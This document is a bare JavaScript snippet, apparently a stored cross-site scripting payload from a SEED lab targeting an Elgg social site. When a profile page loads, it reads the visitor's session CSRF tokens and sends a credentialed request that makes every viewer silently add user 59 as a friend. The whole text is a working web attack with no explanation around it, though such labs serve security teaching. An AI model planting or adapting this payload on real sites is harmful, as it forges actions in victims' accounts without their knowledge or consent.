<script>
    window.onload = async () => {
        let friend_target_id = '59';
        if (elgg.session.user.guid != friend_target_id) await fetch(`http://www.seed-server.com/action/friends/add?friend=${friend_target_id}&__elgg_ts=${elgg.security.token.__elgg_ts}&__elgg_token=${elgg.security.token.__elgg_token}&__elgg_ts=${elgg.security.token.__elgg_ts}&__elgg_token=${elgg.security.token.__elgg_token}`, {
    "credentials": "include",
    "headers": {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "en-US,en;q=0.5",
        "X-Requested-With": "XMLHttpRequest",
        "Sec-GPC": "1"
    },
    "referrer": "http://www.seed-server.com/profile/charlie",
    "method": "GET",
    "mode": "cors"
});

    };
</script>